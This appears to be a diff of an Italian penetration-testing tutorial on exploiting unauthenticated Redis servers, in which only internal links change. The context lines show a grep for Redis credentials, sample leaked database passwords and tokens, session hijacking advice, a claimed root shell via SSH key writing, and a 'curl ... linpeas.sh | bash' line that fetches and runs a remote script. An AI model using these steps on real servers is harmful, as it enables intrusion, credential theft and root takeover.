@@ -19,7 +19,7 @@ tags:
 
 Redis (Remote Dictionary Server) è il database in-memory più usato al mondo: cache delle sessioni, code di messaggi, rate limiting, leaderboard in tempo reale, pub/sub. Ascolta sulla porta 6379 TCP e per molti anni è stato distribuito **senza autenticazione di default e in bind su tutte le interfacce**. Questo ha reso Redis uno dei servizi più sfruttati nei penetration test e uno dei path più rapidi verso una shell: se Redis è esposto senza password, bastano letteralmente quattro comandi per scrivere una chiave SSH nel server e ottenere accesso root. Nel 2026 Redis 7.x ha corretto i default (bind 127.0.0.1, protected mode), ma le installazioni legacy, i container Docker mal configurati e gli ambienti di sviluppo promossi in produzione continuano a esporre Redis senza protezione.
 
-Redis non è solo una cache — contiene session token (session hijacking), credenziali (se l'applicazione li salva), dati business critici e configurazioni. Un Redis compromesso è spesso la porta d'ingresso per [privilege escalation](https://hackita.it/articoli/linux-privesc) e lateral movement nell'intera infrastruttura.
+Redis non è solo una cache — contiene session token (session hijacking), credenziali (se l'applicazione li salva), dati business critici e configurazioni. Un Redis compromesso è spesso la porta d'ingresso per [privilege escalation](https://hackita.it/articoli/linux-privesc/) e lateral movement nell'intera infrastruttura.
 
 ## 1. Enumerazione
 
@@ -125,7 +125,7 @@ grep -riE "redis://|REDIS_URL|REDIS_PASSWORD" /opt/ /var/www/ /home/ 2>/dev/null
 REDIS_URL=redis://:R3d1s_Pr0d_2025!@10.10.10.40:6379/0
 ```
 
-Connection string trovata nei `.env`, `docker-compose.yml`, [repository SVN/Git](https://hackita.it/articoli/porta-3690-svn), configurazioni [Spark](https://hackita.it/articoli/porta-4040-spark-ui) e [Kibana](https://hackita.it/articoli/porta-5601-kibana).
+Connection string trovata nei `.env`, `docker-compose.yml`, [repository SVN/Git](https://hackita.it/articoli/porta-3690-svn/), configurazioni [Spark](https://hackita.it/articoli/porta-4040-spark-ui/) e [Kibana](https://hackita.it/articoli/porta-5601-kibana/).
 
 ## 3. Enumerazione Dati — Cosa C'è in Redis
 
@@ -191,7 +191,7 @@ Sessione dell'admin → usa il session cookie per impersonarlo nell'applicazione
 "{\"host\":\"db-prod.corp.internal\",\"port\":3306,\"user\":\"webapp\",\"password\":\"W3bApp_DB_2025!\",\"database\":\"production\"}"
 ```
 
-Credenziali [MySQL](https://hackita.it/articoli/porta-3306-mysql) in chiaro.
+Credenziali [MySQL](https://hackita.it/articoli/porta-3306-mysql/) in chiaro.
 
 ```bash
 # API keys
@@ -208,7 +208,7 @@ Credenziali [MySQL](https://hackita.it/articoli/porta-3306-mysql) in chiaro.
 "{\"username\":\"admin\",\"email\":\"admin@corp.com\",\"password_hash\":\"$2b$12$abc...\",\"api_token\":\"Bearer eyJ...\"}"
 ```
 
-Hash bcrypt → [Hashcat](https://hackita.it/articoli/hashcat) mode 3200. JWT token → decode e usa.
+Hash bcrypt → [Hashcat](https://hackita.it/articoli/hashcat/) mode 3200. JWT token → decode e usa.
 
 ### Scan incrementale (per database grandi)
 
@@ -255,7 +255,7 @@ root@server:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-**Root shell in 7 comandi.** Funziona se: Redis gira come root (o un utente con home directory scrivibile), SSH è attivo sulla [porta 22](https://hackita.it/articoli/ssh) e la directory `/root/.ssh/` esiste (o la home dell'utente Redis).
+**Root shell in 7 comandi.** Funziona se: Redis gira come root (o un utente con home directory scrivibile), SSH è attivo sulla [porta 22](https://hackita.it/articoli/ssh/) e la directory `/root/.ssh/` esiste (o la home dell'utente Redis).
 
 ## 5. RCE — Webshell
 
@@ -387,7 +387,7 @@ find / -perm -4000 -type f 2>/dev/null
 curl http://10.10.10.200/linpeas.sh | bash
 ```
 
-Path comuni: [kernel exploit](https://hackita.it/articoli/kernel-exploits) se sistema vecchio, SUID binaries, sudo misconfiguration, credenziali in `/etc/redis/redis.conf` che funzionano per SSH.
+Path comuni: [kernel exploit](https://hackita.it/articoli/kernel/) se sistema vecchio, SUID binaries, sudo misconfiguration, credenziali in `/etc/redis/redis.conf` che funzionano per SSH.
 
 ## 11. Detection & Hardening
 
